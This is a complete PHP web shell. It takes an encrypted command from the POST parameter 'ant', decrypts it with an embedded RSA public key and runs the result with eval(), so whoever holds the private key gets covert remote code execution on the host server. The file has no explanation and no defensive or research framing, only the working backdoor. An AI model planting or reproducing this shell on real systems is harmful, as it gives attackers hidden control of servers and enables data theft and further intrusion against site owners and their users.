<?php
$cmd = @$_POST['ant'];
$pk = <<<EOF
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCMW63lxFFvUyG2qDf2alJzkWO1
DR36UM9I4IO6fv4TNqztraeUHMnHGSGN1P1Jw1DEjEWUsBWuJVH79zt7ovyAXsfp
yzmWiH/g3nPxj8tYpnyEuFQdQCVNAfOCvylr2F3EpO8Uwsii86WSRyGBs4Z0KF0R
YfoF+0/ga038/XG+ewIDAQAB
-----END PUBLIC KEY-----
EOF;
$cmds = explode("|", $cmd);
$pk = openssl_pkey_get_public($pk);
$cmd = '';
foreach ($cmds as $value) {
  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) {
    $cmd .= $de;
  }
}
eval($cmd);